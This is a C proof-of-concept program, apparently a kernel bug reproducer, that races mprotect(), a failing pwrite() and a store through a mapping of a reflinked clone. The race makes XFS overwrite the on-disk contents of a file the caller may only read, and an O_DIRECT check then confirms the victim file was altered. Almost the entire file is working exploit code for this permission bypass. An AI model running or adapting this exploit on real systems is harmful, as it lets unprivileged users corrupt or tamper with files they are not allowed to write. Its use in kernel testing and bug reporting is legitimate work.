// SPDX-License-Identifier: GPL-2.0
/*
 * usage: prog DIR VICTIM [TRIES]
 *
 * VICTIM is a file on XFS that the caller can only read, and whose
 * size is not a multiple of 4096.  DIR is a directory on the same
 * filesystem that the caller can write.  The start of the last block
 * of VICTIM gets overwritten on disk.
 *
 * F is a clone of VICTIM.  Three threads act in this order:
 *
 *   locker  one mprotect() of a big mapping, which holds mmap_lock
 *           for write for a few milliseconds
 *   writer  pwrite() into the last block of F from a PROT_NONE page.
 *           It reserves COW space, then faults on the source.  A
 *           fault in kernel mode needs mmap_lock, so it waits for the
 *           locker and then fails with EFAULT
 *   main    stores through a mapping of F while the writer waits.
 *           This fault runs under the VMA lock and finds the
 *           reservation of the writer
 *
 * The write does not go through the page cache of VICTIM, so the
 * program checks with an O_DIRECT read and drops those pages after a
 * hit.  It counts the tries in which the store began and ended while
 * pwrite() was running.  Only those test anything.
 */
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/vfs.h>
#include <linux/fs.h>

#define PG	4096
#define BIG	(1UL << 30)

static pthread_barrier_t bar;
static char *big, *bad;
static long long hold;	/* ns that one mprotect() of big takes */
static long long w0, w1;	/* start and end of pwrite() */
static int ffd, prot;
static off_t blk;

static void die(const char *what)
{
	perror(what);
	exit(2);
}

static long long now(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

static void flip(void)
{
	prot = prot ? PROT_NONE : PROT_READ;
	if (mprotect(big, BIG, prot))
		die("mprotect");
}

static void wait_part(int eighths)
{
	long long until = now() + hold * eighths / 8;

	while (now() < until)
		;
}

static void *locker(void *unused)
{
	pthread_barrier_wait(&bar);
	flip();
	return NULL;
}

static void *writer(void *unused)
{
	pthread_barrier_wait(&bar);
	wait_part(1);
	w0 = now();
	if (pwrite(ffd, bad, 8, blk) >= 0 || errno != EFAULT)
		die("pwrite did not fail with EFAULT");
	w1 = now();
	return NULL;
}

int main(int ac, char **av)
{
	static char orig[PG] __attribute__((aligned(PG)));
	static char disk[PG] __attribute__((aligned(PG)));
	int vfd, dfd, try, tries = 200, inside = 0;
	char f[600], tag[33], *m;
	long long t, s0, s1;
	pthread_t lt, wt;
	struct statfs sf;
	struct stat st;

	if (ac > 3)
		tries = atoi(av[3]);
	if (ac < 3 || tries < 1) {
		fprintf(stderr, "usage: %s DIR VICTIM [TRIES]\n", av[0]);
		return 2;
	}
	snprintf(f, sizeof(f), "%s/F", av[1]);
	vfd = open(av[2], O_RDONLY);
	dfd = open(av[2], O_RDONLY | O_DIRECT);
	if (vfd < 0 || dfd < 0 || fstat(vfd, &st) || fstatfs(vfd, &sf))
		die("VICTIM");
	blk = st.st_size & ~(PG - 1L);
	if (sf.f_bsize != PG || st.st_size - blk < 32) {
		fprintf(stderr, "need 4096 byte blocks, and at least 32 "
			"bytes in the last block of VICTIM\n");
		return 2;
	}
	if (pread(dfd, orig, PG, blk) != st.st_size - blk)
		die("pread VICTIM");
	snprintf(tag, sizeof(tag), "run %-10d at %-13ld\n", getpid(),
		 (long)time(NULL));

	/* Every page of big maps the zero page, with its own PTE. */
	bad = mmap(NULL, PG, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1,
		   0);
	big = mmap(NULL, BIG, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1,
		   0);
	if (bad == MAP_FAILED || big == MAP_FAILED)
		die("mmap");
	prot = PROT_READ;
	madvise(big, BIG, MADV_NOHUGEPAGE);
	if (madvise(big, BIG, MADV_POPULATE_READ))
		die("MADV_POPULATE_READ");
	flip();
	t = now();
	flip();
	hold = now() - t;
	printf("one mprotect() takes %lld us\n", hold / 1000);
	pthread_barrier_init(&bar, NULL, 3);

	for (try = 1; try <= tries; try++) {
		unlink(f);
		ffd = open(f, O_RDWR | O_CREAT, 0600);
		if (ffd < 0 || ioctl(ffd, FICLONE, vfd))
			die("FICLONE");
		m = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_SHARED, ffd,
			 blk);
		if (m == MAP_FAILED)
			die("mmap F");
		/* Read the page in, so that the store needs no I/O. */
		*(volatile char *)m;

		if (pthread_create(&lt, NULL, locker, NULL) ||
		    pthread_create(&wt, NULL, writer, NULL))
			die("pthread_create");
		pthread_barrier_wait(&bar);
		wait_part(4);
		s0 = now();
		memcpy(m, tag, 32);
		s1 = now();
		pthread_join(wt, NULL);
		pthread_join(lt, NULL);
		if (w0 < s0 && s1 < w1)
			inside++;

		fsync(ffd);
		if (pread(dfd, disk, PG, blk) < 32)
			die("pread VICTIM");
		munmap(m, PG);
		close(ffd);
		if (memcmp(disk, orig, 32)) {
			posix_fadvise(vfd, 0, 0, POSIX_FADV_DONTNEED);
			printf("try %d: VICTIM overwritten with %s\n", try,
			       memcmp(disk, tag, 32) ? "other data" :
			       "the data of this run");
			return 0;
		}
	}
	printf("%d tries, %d with the store inside the write: VICTIM "
	       "unchanged\n", tries, inside);
	return inside ? 1 : 2;
}
